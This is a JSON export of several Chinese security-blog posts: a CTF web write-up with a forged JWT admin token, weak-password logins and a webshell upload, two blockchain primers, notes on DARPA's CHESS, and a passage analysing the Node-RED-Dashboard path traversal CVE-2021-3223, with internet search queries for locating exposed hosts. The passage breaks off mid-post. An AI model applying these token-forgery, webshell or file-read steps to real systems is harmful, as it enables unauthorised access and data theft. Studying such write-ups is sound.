[{"id":"3b1f17f810cefe376d3cc7273932f8df","title":"长安杯2021高校组WEB部分","content":"EzPyjwtcrack进行secret爆破， 密钥：CTf4r\n伪造token\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJwYXNzd2QiOiJhZG1pbiIsInVpZCI6ImNmNTVhOGI0LWE1ZTEtNGQyYS04YzNkLWNkZDdlNjI1MDUwNSIsInJvbGUiOiJhZG1pbiJ9.4yZ_LgU1jIj3Ov7mXn_kFUnCv5M2i6yajzh2uaXqDl4\n\n已经利用到了eval函数了，但是不知道如何去执行代码，求一个WP\nasuka弱口令登录后台admin/admin\n\n上传打包好的war文件，内含webshelll\n\n冰蝎连接即可\n\nOld But A Little New弱口令登录后台admin/admin\n和上一题一样操作。估计是主办方题目出问题了。\n","slug":"长安杯2021高校组WEB部分","date":"2021-10-01T11:31:54.000Z","categories_index":"CTF","tags_index":"CTF","author_index":"A1andNS"},{"id":"864177384073294800bbb715f9b2f33a","title":"读《区块链技术与应用》小记","content":"前言近期，开始学习区块链的相关知识了，手头上搞到了一本华为区块链技术开发团队编写的《区块链技术及应用》来简单的系统化入门和了解区块链。并将一些我阅读中的心得或者说是觉得重要之处记录于此，一些概念性的东西可以自行Google。\n区块链技术之基础哈希运算区块链账本数据主要是通过父区块的哈希值组成的链式数据结构。以此保证其不可篡改性。在区块链中常用SHA-256算法来进行hash运算。\nhash运算之特性：\n\n正向快速（计算速度快）\n输入敏感（雪崩效应）\n逆向困难（难以逆推）\n强抗碰撞性（碰撞概率很小，相对而言即暴力枚举成本极高）\n\n链式结构设计很巧妙，每一个区块主要包括了父区块哈希值、时间错、默克尔树根等信息，其中父区块哈希值十分关键了，如果某一个区块被篡改，将会导致该区块hash发生改变，从而与子区块中记录的父区块hash值不符合，导致区块链断裂。而如果要篡改，那可能需要将篡改区块后的所有区块的父区块hash全改一遍，这个工作量是十分巨大的，而且每10分钟甚至更短时间就会打包一个新区块。故而说区块链技术具有防篡改性，因为篡改成本高到可怕。\n数字签名数字签名是用于验证身份的，区块链中主要用来实现权限控制，识别交易发起者的合法身份，防止恶意节点身份冒充。\n签名之原理：\n发送方A对原始数据先进行hash计算得到一个数字摘要，使用非对称密钥对中的私钥对数字摘要进行加密，这个加密后的数据就是数字签名。\n验证签名的过程：\n接收方B使用发送方A的非对称加密的公钥来对数字签名进行解密，得到原始数据的hash值，然后再通过对A的原始数据进行相同的hash运算得到一个数字摘要，然后对比解密签名得到的hash和原始数据计算得到的比较，如果一致，则签名验证通过。\n共识算法PoW、Po*、拜占庭容错算法、结合可信执行环境的共识算法。\n其中PoW是最常见的算法，bitcoin使用的就是PoW，但是这个共识算法也有不好的地方，过于消耗能源，造成大量能源浪费。所以也产生了一些针对这个问题，而改进的一些应用币种，例如质数币，利用挖矿过程中的大量浪费能源来为科研做出一点点贡献。但是这种模式实在是太过于浪费能源了。\nPo*引入了凭证的概念，会根据每个节点的某些属性来定义出块难度和优先级，从而一定程度上减少开销和能源消耗，但是问题是它具有中心化趋势，与区块链的理念相悖，而且这样做的话明显会使得矿工激励不足，使得节点缺乏参与动力。\n拜占庭容错算法则是类似于选举出leader来负责出块，然后leader也可能被推翻，这种算法不适用于节点大量的系统，因为节点之间的这个选举和协商过程会有很大的开销，因为它是有可能经常出现选举新leader和推翻旧leader的情况出现的。\n结合可信执行环境，很明显了首先就是要有可信执行环境才行，需要软硬件结合，这个我觉得还是很难实现的，区块链中往往节点的安全性和性能是参差不齐的，有的节点可能就是安全性低和很脆弱的。故而可信执行环境这个点要想实现很难，不可能区块链节点都拥有这样的可信执行环境。\n智能合约智能合约早在1995年就被Nick Szabo提出了，这东西就是个合同，只不过他是由脚本自动化执行的电子合同，它没有一个中间人来执行条款，而是100%由计算机代码来执行。所以他就是触发某个条件就会去自动执行的自动化脚本。基于区块链的智能合约需要包括事务处理机制、数据存储机制以及完备的状态机。触发条件就是if，预置条件就是if语句中执行的代码。具体内容可以去学习以太坊的智能合约。\n\n智能合约往往是由程序员来进行编写的，它经常出现的问题是逻辑问题，当然也可能是程序员使用了一些不确定性的指令，导致系统出现奇异，影响系统的一致性。目前区块链平台也都引入了一些改进机制来消除不确定性，例如以太坊就要求使用其专用的solidity语言来进行区块链的开发工作，以此来保证智能合约执行动作的一致性。\nP2P网络pear to pear网络是区别于传统C/S网络的，传统的C/S网络是需要一个中心服务器的，客户端之间的通讯是依赖于中心服务其的转发，所以中心服务器就成为影响整个网络的关键因素，这就是中心化问题了。而Pear to Pear网络是对等网络，所有的设备之间是地位对等的，所以这样就没有中心服务器了，去中心化的特点就是及时某些节点损坏也不影响网络整体上的通讯。\n而区块链正是需要这样的一个去中心化的分布式通讯需求，所以P2P成为了区块链通讯采用的方式就顺理成章了，毕竟如果区块链使用的是C/S网络的话，中心服务器将会承受极其巨大的压力。\n区块链的特性透明可信区块链系统设计成一个去中心化的分布式系统，使用了P2P网络来作为基础的通讯网络结构，每一个节点都是地位上对等的，所以这也让信息是透明的，不会出现所谓信息不对等，中心节点成为一个黑盒，其他节点无法知道所有信息。记账过程也是每个节点都记账即都参与，从而保证账本的可信性。故透明可信。\n防篡改可追溯所谓防篡改，这个就是前面说到的了。区块链系统设计成链式结构，而且每一个区块和父区块hash都有关系，故而要篡改区块信息成本是十分巨大的，只有控制操作51%的算力才能实现。防篡改并非不能被篡改，只不过要篡改需要付出巨大代价，当代价足够大就使得篡改是件吃力不讨好的事，自然使得具有了一定的防篡改性。而可追溯也得益于防篡改了，真是因为防篡改，所以使得记录可信，故而追溯得以实现，否则溯源记录可信度低，其意义不大。\n隐私安全保障区块链系统中的用户已私钥作为唯一标识，而且其去中心化决定了其的“去信任”特性，区块链只关注私钥参与区块链上的各类交易，而不关注私钥由何人持有。对于区块链而言，其只能知道一个持有某个私钥的人进行了交易，而无法知道持有私钥的人到底是谁，这也保护了交易者的信息。所以啊私钥一定要保护好啊！\n系统高可靠因为区块链系统的对等网络特性，使得即使有部分节点奔溃，依旧可以保证网络的可靠性。\n","slug":"读《区块链技术与应用》小记","date":"2021-09-28T07:53:21.000Z","categories_index":"学习笔记","tags_index":"区块链","author_index":"A1andNS"},{"id":"268a3b6bf1055fd03ee61fb9fcbc2807","title":"Blockchain Security入门笔记","content":"Blockchain入门必须从相关名词开始入手。\n钱包WalletWallet是一个管理私钥的工具，通常包含一个软件客户端，允许使用者通过钱包检查、存储、交易持有的数字货币。这是一个重要的设施和入口。关于钱包的攻击主要集中再钓鱼和第三方hijack，这意味着钱包持有者需要提高安全意识。\n冷钱包Cold Walletcold wallet是一种脱离网络连接的离线钱包，将数字货币进行离线存储的钱包。使用者生成数字货币地址和私钥保存在冷钱包而无需网络支持，因此cold wallet的私钥不容易被hacker获取，但是也存在安全风险，例如random number不安全、hardware损坏与丢失等等。而最重要的东西还是那个私钥，必须要保护好私钥的安全。\n热钱包Hot Wallet这个很明显就是Cold Wallet的反义了，所以Hot Wallet自然就是需要网络的在线钱包。但是在线钱包带来便利的同时也带来了更多的安全风险，例如钓鱼网站盗取钱包文件，泄露钱包密码，或者私钥被破解等的问题。注意：中心化管理钱包并非绝对安全，最好在不同平台设置不同的密码，启用二次认证，提升安全性。\n公钥Public KeyPublic Key是与私钥成对出现的，这个和非对称加密的公私密钥类似吧。Public Key与Private Key组成了一个密钥对，公钥由私钥生成，无法逆推私钥。公钥能够通过一系列算法运算得到钱包的地址，因此能够作为拥有这个钱包地址的凭证。\n私钥Private KeyPrivate Key是一串由随机算法生成的数据，它可以通过非对称加密算法算出公钥，公钥可以再算出币的地址。私钥是非常重要的，区块链资产实际在区块链上，所有者实际只拥有私钥，私钥代表了你对区块链资产的绝对控制权，因此，区块链资产安全问题的核心问题应该在于私钥的存储上。\npublic key和private key实际上就是利用了非对称加密算法带来的好处，提升了数据的安全性。私钥加密再由公钥解密，和传统的账号和密码形式相比安全性提高了数据传输的安全性和完整性。\n助记词Mnemonic由于私钥是一长串毫无意义的字符，难以记忆，故而出现了mnemonic，就像IP地址难以记忆，故而出现了domain一样。mnemonic是利用固定算法来将私钥转换为十多个常见的英文单词，以便于记忆。所以助记词与私钥是直接关联，可以互相转换，故而助记词也需要如private key一样保护。而且助记词是明文性的，更要注意，避免泄露。最安全的保存方式自然是物理方式，电子文档还是存在更大泄露风险。\nKeystoreKeystore主要在以太坊wallet中较为常见，它是把私钥通过钱包密码再加密来的，与助记词不同。私钥通过钱包密码再加密得来的，与助记词不同，一般可保存为文本或 JSON 格式存储。换句话说， Keystore 需要用钱包密码解密后才等同于私钥。这意味着原本私钥的安全性问题就间接变为wallet密码的安全问题，如果wallet密码强度不高，那么可能导致private key也会不安全。存在暴力破解wallet password然后结合盗取的keystore解密出私钥的风险。故而keystore使用后，需要加强对wallet密码的保护，提高wallet密码强度。\n备份、备份还是备份，区块链数字钱包的私钥、助记词、keystore都要注意备份，采取多重、多次备份来减少因为这三者丢失照成的风险。\nimToken钱包安全“十不原则”\n不使用未备份的钱包 \n不使用邮件传输或存储私钥 \n不使用微信收藏或云备份存储私钥\n不要截屏或拍照保存私钥 \n不使用微信、QQ 传输私钥\n不要将私钥告诉身边的人\n不要将私钥发送到群里\n不使用第三方提供的未知来源钱包应用\n不使用他人提供的 Apple ID\n不要将私钥导入未知的第三方网站\n\n公链Public BlockchainPublic Blockchain即公有链，是全球所有人都可以随时进入读取、交易、确认的共识Blockchain。公有链通常认为是完全去中心化的，链上的数据都是公开透明的，不可更改，任何人都可以通过交易或挖矿读取和写入数据。\n一般通过代币机制（Token）来鼓励参与者竞争记账，来确保数据的安全性。无法检测所有公链。因为检测所有的公链的工作量非常大，只依靠一家企业不可能实现全体区块链生态安全监控，这就导致hacker能够转空子在众多公链中寻找可利用漏洞发起攻击。\n公链被黑已经累计损失5200W US Dollars\n\n交易所Exchange区块链交易所就是类似证券交易所类似的功能，只不过这里的交易所是数字货币买卖交易的平台。数字货币交易所又分为中心化交易所和去中心化交易所。\n去中心化交易所交易行为直接发生在区块链上，数字货币会直接发回使用者的钱包，或是保存在区块链上的智能合约。这种设计的好处在于交易所不会持有用户大量的数字货币，所有的数字货币都存储在用户钱包或者平台的智能合约上。信任层面去中心化了，交易所的信任问题就被解决了，每笔交易都是在区块链上公开透明，交易所不用保管用户资产和私钥，这样用户资产完全由用户自己控制，提高了个人数据安全性和隐私性。常见去中心化交易所有WhaleEx、Bancor、dYdX等。\n去中心化交易所只是一个交易平台，而不直接经手用户资产和私钥，用户实际上只直接进行了交易，对公共链进行修改。\n中心化交易所目前热门交易所多是采用了中心化技术的交易所，使用者需要在平台上注册，并经过一系列身份认证KYC后，才能在平台上进行数字货币的交易。所谓中心化交易所，我感觉类似是区块链世界中的银行，这个银行中存储了大量的数字货币，然后用户们的交易也是在这个拥有大量数字货币的银行中进行的。这种交易并没有影响到外部的公共区块链，这只是内部的数字货币所有者变动而已，对于外部来说应当是不公开透明的。相当于交易所维护一个内部数据库，来控制不同用户资产，同时及时提供提款服务保障即可。对外这个拥有大量用户的数字资产的交易所才是一个区块链用户。这样似乎是能够减少对公链的频繁修改。\n但是bank是一种存储了大量财富的地方，那肯定有人会打它的主意，而中心化Exchange就是这样的一个资产聚集地，自然也成了hackers的重要目标。常见中心化交易所币安、火币、OKEx等\n\n截止现在交易所被黑导致的损失达到了64多亿US Dollars\n节点Node在传统互联网中，数据是集中存放的，即所谓中心化问题，使用中心化的服务器来存储数据，它存在的最大危机就是，如果这个中心出现故障，那就意味着大家都无法使用。所以分布式数据库出现了，而区块链就是去中心化的分布式数据库，由千万个小“服务器”构成的巨大网络。\n区块链网络中的每一个节点就是存储所有区块数据的每一台电脑或服务器。新区快的产生、交易验证、广播同步都是由节点来完成。Node也可以细分为全节点和轻节点。\n全节点：拥有全网所有的交易数据的节点\n轻节点：只拥有和自己相关的交易数据节点\n而分布式就体现在每一个全节点都会保存全网所有交易数据，相当于是在这个区块链网络中对交易数据有多重备份，即使某个节点down掉了，整个网络依旧可以正常运作。\nRPCRPC是Remote Procedure Call，远程过程调用的缩写，这是一个计算机通讯协议。\n以太坊 RPC 接口是以太坊节点与其他系统交互的窗口，以太坊提供了各种 RPC 调用：HTTP、IPC、WebSocket 等等。在 以太坊源码中，server.go 是核心逻辑，负责 API 服务的注入，以及请求处理、返回。http.go 实现 HTTP 的调用，websocket.go 实现 WebSocket 的调用，ipc.go 实现 IPC 的调用。以太坊节点默认在 8545 端口提供了 JSON RPC 接口，数据传输采用 JSON 格式，可以执行 Web3 库的各种命令，可以 向前端（例如 imToken、Mist 等钱包客户端）提供区块链上的信息\n关于RPC攻击的经典案例是以太坊黑色情人节漏洞，攻击者利用以太坊节点Geth/Parity RPC API鉴权缺陷，恶意调用eth_sendTransaction盗取代币，持续两年，造成巨大资产损失。\n共识Consensus共识算法主要是解决分布式系统中多节点之间对某个状态达成一致性结果的问题。分布式系统给由于具有多个服务节点共同完成你事物处理，所以对整个分布式系统而言，它在对外是应当要保持数据状态的一致性。但是现实问题是，由于节点的不可靠性和通讯的不稳定性，甚至节点作恶伪造数据等因素的存在，节点之间可能就会出现数据状态的不一致性，所以我们需要引入一个机制来进行协调，让数据状态一致化，这就是共识算法了。\n将不可靠的节点组建成一个可靠的分布式系统，从而提高系统可靠性，数据状态的一致性。\n区块链系统本身作为一个超大规模的分布式系统，但又与传统的分布式系统存在明显区别。由于它不依赖于任何一个中央权威，系统建立在去中心化的点对点网络基础之上，因此分散的节点需要就交易的有效与否达成一致，这就是共识算法发挥作用的地方，即确保所有节点都遵守协议规则并保证所有 交易都以可靠的方式进行。由共识算法实现在分散的节点间对交易的处理顺序达成一致，这是共识算法在区块链系统中起到的最主要作用。\n共识算法本质上就是在解决分布式系统如何保持一致性的问题\n工作量证明PoWPoW（proof of work）是历史上第一个成功去中心化区块链共识算法，被比特币、以太坊，莱特币等主流公链广泛使用。\n工作量证明要求节点参与者执行计算密集型的任务，但是对于其他网络参与者来说易于验证。在比特币的例子中，矿工竞相向由整个网络维护的区块链账本中添加所收集到的交易，即区块。为了做到这 一点，矿工必须第一个准确计算出“nonce”，这是一个添加在字符串末尾的数字，用来创建一个满足开头特定个数为零的哈希值。不过存在采矿的大量电力消耗和低交易吞吐量等缺点。\n权益证明PoSPoS（proof of Stake）是一种主流的去区块链共识算法，目的是为了让区块链里的分布 式节点达成共识，它往往和工作量证明机制(Proof of Work)一起出现，两种都被认为是区块链共识算法里面的主流算法之一。作为一种算法，它通过持币人的同意来达成共识，目的是确定出新区块，这过程相对于 PoW，不需要硬件和电力，且效率更高。\nPoS 共识中引入了 Stake 的概念，持币人将代币进行 Staking，要求所有的参与者抵押一部分他们所拥有的 Token 来验证交易，然后获得出块的机会，PoS 共识中会通过选举算法，按照持币量比例以及 Token 抵押时长，或者是一些其他的方式，选出打包区块的矿工。矿工在指定高度完成打包交易，生成新区块，并广播区块，广播的区块经过 PoS 共识中另外一道”门槛”，验证人验证交易，通过验证后，区块得到确认。这样一轮 PoS 的共识过程就进行完成了。权益证明通过长期绑定验证者的利益和 整个网络的利益来阻止不良行为。锁定代币后，如果验证者存在欺诈性交易，那么他们所抵押的 Token 也会被削减。PoS 的研究脚步还在不断前进，安全、性能和去中心化一直都是 PoS 所追求的方向，未来也将有更多 PoS 的项目落地。\n委托权益证明DPoSDPoS（Delegate Proof of stake）诞生于2013年12月8日，在DPoS 中，让每一个持币者都可以进行投票，由此产生一定数量的代表 ,或者理解为一定数量的节点或矿池，他们彼此之间的权利是完全相等的。持币者可以随时通过投票更换这些代表，以维系链上系统的“长久纯洁性”。在某种程度上，这很像是国家治理里面的代议制，或者说是人大代表制度。这种制度最大的好处就是解决了验证人过多导致的效率低下问题，当然，这种制度也有很明显的缺点，由于 “代表”制度，导致其一直饱受中心化诟病。DPoS让代表代替所有持有人来代表进行表决，实际相当于持有人受让出一部分权力由其代为执行，这就出现了中心化问题了，所以才会饱受诟病。\n恶意挖矿攻击Cryptojacking AttackCryptojacking是一种恶意行为，是在未授权情况下劫持用户设备挖掘加密货币。通常，攻击者会劫持受害者设备(个人 PC 或服务器)的处理能力和带宽，由于加密货币挖掘需要大量算力，攻击者会尝试同时感染多个设备，这样他们能够收集到足够的算力来执行这种低风险和低成本的挖矿活动。\n这种就是常见的挖矿木马，通过恶意挖矿脚本来占用和利用你的设备的带宽和算力，为其挖矿牟利。这种挖矿木马的溯源分析学习，先前也做过一次实验，挖矿木马感染主机后明显的特征就是CPU占用率极高，甚至持续高达100%。\n对于防范挖矿木马：\n\n注意设备性能和CPU利用率，如果CPU利用率出现异常就需要引起警惕。\n在Web浏览器上安装挖矿脚本隔离插件，例如MinerBlock、NoCoin和adblocker等。\n小心陌生电子邮件的附件和链接，病从口入啊\n安装一个值得信赖的安全防护软件，并且保持操作系统和应用程序更新，避免因为未打补丁照成的不必要损失。\n\n无利益攻击Nothing at stake AttackNothing at stake Attack是在PoS共识机制下的待解决问题，问题本质是“作恶无成本，好处无限多”。因为PoS让每个持有人都可以参与到确认出块中来，而当PoS系统出现分叉Fork时，同时在两个fork上出块，无论哪一个fork成为公链，该节点都可以获利，故而某些持有人（节点）恶意地推动分叉，支持或发起不合法交易，以此牟利，但是同时也使得fork大量增加，久而久之区块链网络的一致性将收到破坏，无法达成共识。\n所以PoS为此引入了惩罚机制，对恶意节点进行经济惩罚，以此维护网络稳定。并且发展出了DPoS来解决无利益攻击问题，因为DPoS由持有人选出某些节点来运营网络，这样实际上就可以排除一大部分作恶者，并且可以随时选举替换代表，保证运营节点的纯洁性。\n多签Multi-sig多签就是需要多个签名才能执行操作，而这里的多个签名是由多个不同私钥生成的。这样做可以提高安全性，即使丢失一个私钥，攻击者也不能借此控制账户，必须多个可信方同时授权操作才会生效。这就像现实中很多重要系统，都会有两个钥匙来提高安全性，只有持有钥匙的两个人同时使用钥匙才能开启某个系统。这其实也是二者或多方达成共识，才使得操作生效。\n双花攻击 Double Spend AttackDouble Spend，一笔钱花两次，十分形象了。利用数字货币的数字特征两次或多次使用“同一笔钱”来交易，双花攻击不产生新Token，把一笔Token转到另外一个地址，然后再通过一些手法来让交易回滚，把花出去的钱再拿回来。常见手法如下：\n1. Race Attack通过控制矿工费来实现双花，同时发起两个交易，一个是正常交易，另一笔交易发给自己。同时给那笔给自己的交易更多的矿工费，由于给自己那笔交易矿工费用更高，所以被矿工优先打包进区块的概率比较高。这就会让给自己这笔交易早与商家的交易，那么商家的交易就会被回滚。这样就实现了双花。\n2. Finney Attack利用时间差来实现双花，故意不广播给自己的交易区块，等商家交易发起后，再广播前者区块。攻击对象是接受0确认的商家。假设攻击者挖到区块，该区块中包含着一个交易，即 A 向 B 转了一定数量的Token，其中 A 和 B 都是攻击者的地址。但是攻击者并不广播这个区块，而是立即找到一个愿意接受 0 确认交易的商家向他购买一个物品，向商家发一笔交易，用 A 向商家的地址 C 支付，发给商家的交易广播出去后，攻击者再把自己之前挖到的区块广播出去，由于发给自己的交易先于发给商家的交易，对于攻击者来说，通过控制区的广播时间，就实现了同一笔 Token 的“双花”。\n\n\n\n\n\n\n\n\n\n零确认交易（Zero Confirmation Transaction ）是指交易卖家不等待该笔交易被区块链网络节点确认，即交付出售的东西。零确认交易是一种信任的标志，卖方必须相信买方在该笔交易被区块链中的其他节点记录前不会再尝试将其持有的加密货币再花在其他地方。说到底利用零确认交易的信任机制，这就是信任问题。\n3. Vector76 Attack这是一种将Race Attack和Finney Attack结合的攻击手法。攻击者通过建立两个节点，一个用于连接商家节点A，一个用于连接区块链网络中的其他节点的节点B。接着攻击者使用同一笔token发起两笔交易，交易一给商家，交易二给自己，与Race Attack原理一样，给交易二更多的矿工费。然后先保留两笔交易，不急于像race attack一样广播出去。\n然后做类似Finney attack的工作，去交易一所在的分支上挖矿，挖到区块后，也不广播，而是在节点A上发送交易一，在节点B上发送交易二。这个时候，交易二更有可能被认定为有效，而交易一无效。交易二有效后，立即将之前再交易一所在分支挖到的区块广播出去。这个时候，这个接受一次确认就支付的商家，会确认交易成功，然后攻击者可以立即变现转移资产。\n4. 51% attack当攻击者拥有全网50%以上的算力，攻击者就可以创造一条高度大于原来链的新链，使得旧链交易被回滚，使用同一个token发送一笔新交易，实现双花。但是这个要想实现成本还是很高的，50%的算力也没有那么容易获得。\n软分叉 Soft-fork软分叉(Soft-fork)更多情况下是一种协议升级，当新共识规则发布后，没有升级的旧节点并不会意识到代码已经发生改变，而继续生产不合法的区块，就会产生临时性分叉，但新节点可以兼容旧节点， 即新旧节点始终在同一条链上工作。\n硬分叉 Hard-fork硬分叉是区块链发生永久性分歧。在新共识规则发布后，已经升级的节点无法验证未升级节点产生的区块，未升级节点也无法验证已经升级的节点产生的区块，即新旧节点互不兼容，通常硬分叉就会发生，原有正常的一条链被分成了两条链（已升级的一条链和未升级的一条链，且这两条链互不兼容）。\n参考资料[1]. 雾慢安全团队paper.seebug.org\n","slug":"Blockchain-Security入门笔记","date":"2021-08-24T15:49:18.000Z","categories_index":"学习笔记","tags_index":"区块链","author_index":"A1andNS"},{"id":"42e9f92a9641d13b1a38a01b1f926568","title":"初识人机协同漏洞挖掘之概念","content":"前言近日，有幸可以看到一份关于人机协同探索软件安全的资料，这份资料是在2018年4月19日由DARPA公开发布，各种行业都有人机协同的出现，有的是human-robot,有的是human-mathine，而这种人机协同（human-computer）用于漏洞挖掘的概念很新颖。\n漏洞挖掘方式对比在这份资料的开头就直接给出了一个不同漏洞挖掘方法的比较图，也是十分形象和符合现实情况了。\n\n从上图中，我们可以看出human对于漏洞挖掘速度和准确性都是low，现实情况是什么呢？其实真是如此，人工进行漏洞挖掘其需要大量的时间付出，漏洞的发现速度自然是low的，而准确性很多时候也是low的，例如在一个复杂系统中，人工发现一个异常点后，往往需要跟进到上下文中去进行判断其是否可以利用，是否存在相应漏洞，但是正由于系统的复杂性人工判断时也会存在误判，从而往往时花费了大量时间，但是最终却产出较低。\n由此人类开始借助computer的力量了，我们开发了各种自动化工具，来辅助我们进行代码审计和漏洞发现，自动化工具利用的计算机的高计算能力，在漏洞发现的速度上是远高于人类的。但是同时又产生了一个问题，无论什么自动化工具，终究是按照人类为其制定的规则进行运作，在判断漏洞是否存在上依旧会出现大量误判的情况，可以认为其主要解决了了发现速度慢的问题，但准确性的问题依旧存在。\n而人机协同实验表明，在漏洞挖掘速度提升的同时，也能够提高准确性，这是结合了计算机的高运算能力和人类的认知思维的结果。而最后的CHESS，也就是本文提出的Computer and Human Exploring Software Security，则是兼具高速度和高准确度。\n而目前研究的主要方向应该也是集中于利用人机协同方法来提高漏洞挖掘速度和准确度，降低漏扫设备的误报率应该也是大家的普遍共识了。速度高的问题利用computer来进行批量检测就可以较好满足，所以如何提高准确度是一个核心问题，人机协同的人要如何参与到这个过程中去，并且与计算机更加合理的进行配合，以可以将人类的思维认知能力结合入现有的漏洞扫描或挖掘系统中去。\nCHESS方法接下来看看DARPA提出的CHESS方法，这是DARPA的人机协同方案，有一个流程图如下：\n\n其实从这张图中可以看出human和automation之间协同的部分应该是集中在了Context Processor，也就是我们前面说到的上下文问题，人类挖掘漏洞一般都需要跟进到上下文中来考虑，而computer则是以一种静态规则库为主。这一点，中文paper中南京大学的一篇硕士论文就探讨了这个问题，她是对基于java的静态漏洞扫描器的升级改造，可以说是融入了上下文处理这个环节，使得人机协同工作，她的研究表明通过人机协同方式确实能够降低误报率，即提升准确性，并且根据其陈述，这个研究成果已经应用于其所在企业。\n但是CHESS也存在着诸多挑战，作者文章后面就逐一讲述了各个环节中的挑战和可能的解决方法。\nTA1 Human Collaboration例如在TA1中，就存在：1. 如何去标识和生成一个信息差距代表来传达给人类。2. 如何捕获和处理人类通过推理产生思维。说到底就是人机协同过程中，人如何参与的问题。人机之间如何实现沟通和交互，机器如何表达出人类可以去理解的信息，机器如何去理解人类做出的处理和反应。作者给出的第一个问题的可能答案是使用控制流程图、统一建模语言图或循环活动的希尔伯特曲线。第二个问题的则是使用注释/标签集合、仪表化的程序交互或人类心理模型分析。\nTA1理想状态下，需要实现的过程就是计算机生成人类可以理解的代表性信息，然后由人类来与计算机交互并传达人类的认知和反馈给计算机，计算机也需要将人类反馈的信息转换为漏洞挖掘系统格式，人机之间的交互是较少障碍的情况。当然还有一些愿景需要实现：1.优化人机交互方式。2. 拓展协作能力，不一定是1:1的人机协作。3.降低使用者门槛，利于技术推广，亦可产生更好的效果。4.应该逐渐向着减少人类认知参与比例的方向发展，让人类解放出来，只参与对机器而言较难判断的问题。\nTA2 Vulnerability DiscoveryTA2中，作者列出了三大挑战，第一个是确定发现漏洞类别所需要的信息，第二个是引用CRS技术来对新的和现有的表示进行拓展和推理，第三个是开发新的漏洞检测技术来利用人类提供的认知。\n其需要实现的过程就是分析源代码和二进制文件的潜在漏洞，并且识别出源码和二进制文件中不确定的区域和自动分析中的其他障碍，再去识别漏洞的目标种类，最后生成一份漏洞证明和补丁。这个工作很重要，因为它以机器的手段解决了大多数问题，留下无法处理的问题再交由人类来协同工作。\n\nTA3 Voice of the OffenseTA3中，作者也列出了两个挑战，第一个是开发可拓展到1M+复杂性的挑战性问题。第二个是确保挑战性问题可以代表所需的漏洞类别。这里作者给出的解决方案是前者使用大规模自动化漏洞添加模块，后者使用漏洞测试集合，例如Juliet，CGC，OSS-FUZZ等或者是公共N-day漏洞数据库。\n\n开发具有所有所需类别漏洞和拓展到10k至1M+复杂度的挑战性问题，然后开发一个源码补丁给每一个挑战性问题漏洞，开发一个二进制补丁给每一个挑战性问题漏洞，再为每一类漏洞创建一份漏洞证明规范，开发一个PoV给每一个挑战性问题漏洞。\n这个环节需要确保挑战集合覆盖所有漏洞类别，拓展挑战集合以可以代表大型且复杂的代码库。这是为了保证它能够处理足够多的漏洞类别，从而提高效率。\nTA4 Control Team在TA4中，作者列出了两个主要任务，第一个就是创建一个专家级黑客性能基线来应对TA3的挑战问题。第二个是确保CHESS R&amp;D团队了解软件逆向工程和利用的前沿技术。\n\n一个优秀的系统，肯定是要使用最先进的工具来发现TA3中开发的源码和二进制挑战问题。根据提供的漏洞证明范本来为每一个发现的漏洞生成报告。并且也要在评估期间去收集反馈，以供后续审查。确认控制团队和CHESS系统之间的不同和冲突的评估效果。\nTA5 Integration，Test and Evaluation在TA5中，有两个主要任务，第一个将TA1和TA2的技术和工艺集成到一个平台中，用于评估和过渡。TA5其实就是TA1+TA2，因为二者是紧密联系的，TA2中对漏洞进行发现，发现后可能出现计算机无法判断的情况，这个是否就要交给TA1中的human来进行处理了，由human来提供一个反馈从而实现人机协同。\n参考文献[1]. Computers and Humans Exploring Software Security, Mr. Dustin Fraze\n","slug":"初识人机协同漏洞挖掘之概念","date":"2021-08-14T03:27:21.000Z","categories_index":"学习笔记","tags_index":"漏洞挖掘","author_index":"A1andNS"},{"id":"0754deaddc45dd81af7f6220591fd3dc","title":"Node-RED任意文件读取漏洞CVE-2021-3223","content":"背景知识\n\n\n\n\n\n\n\n\nNode-RED is a programming tool for wiring together hardware devices, APIs and online services in new and interesting ways.\nIt provides a browser-based editor that makes it easy to wire together flows using the wide range of nodes in the palette  that can be deployed to its runtime in a single-clic.\n​                                                                                                                                                           -Node-RED Official Website\nNode_RED 本质上是一个NodeJS 应用程序，所以能够在Linux平台的任何设备上安装，比如流行的有树莓Pi，在工业领域，西门子Iot2000，研华 WISE PaaS 网关，美国Groov EPIC 都预先安装了Node-RED.。\n2021年1月11日有用户Github向node-red项目组提交了一个任意文件读取的问题，issues页面：https://github.com/node-red/node-red-dashboard/issues/669\n前言这次复现的漏洞CVE-2021-3223正是属于Node-RED-dashboard的任意文件读取漏洞，该系统是基于express.js开发，其鉴权方式是依赖配置的，默认没有任何鉴权，当开启鉴权后，会对接口进行鉴权。相关权限在settings.js文件中定义。所以将settings.js作为本次复现中要读取的重要文件之一，我们可以从中来获取重要的配置信息，包括账号密码等。\n其中的username为用户名，password为加密后的密钥，permission为权限，关于权限的信息可以参考https://nodered.org/docs/user-guide/runtime/securing-node-red#usernamepassword-based-authentication\n\n\n\n权限\n说明\n\n\n\n*\n所有权限\n\n\nwrite\n提供写权限，能够进行部署、增、删、改、安装第三方插件等\n\n\nread\n提供读权限，可以查看各类流，但是无法部署和修改（增/删/改）\n\n\n漏洞影响Node-RED-Dashboard &lt; 2.26.2 \n利用此漏洞，可以获取用户名密码和读取服务器敏感数据\n漏洞原理上手看源码吧！去node-red的node-red-dashboard克隆一份源码到本地，commit时间要在2021年1月11日下午8点前的。\n漏洞代码存在于nodes/ui_base.js中，如下图所示：\n\n从上面的代码中可以看出，这里是设计使用RED.httpAdmin.get(&#39;/ui_base/js/*&#39;的方式来提供接口，用于提供静态资源的拉取。\n这里我们从URL中传入的路径是通过req.params[0]来接收，然后其使用了path.join()的方式来进行路径连接，这样就会产生一个目标文件路径。然后这里没有进行任何的处理，就直接交给res.sendFile()方法来获取内容发回客户端。\n这样就出现了一个问题，如果req.params[0]中接收的参数包含../，就可能由此进行目录穿越，从而导致CVE-2021-3223的任意文件读取漏洞。\n漏洞复现利用空间搜索引擎查找目标fofa: title&#x3D;&quot;Node-RED&quot;\nzoomeye: 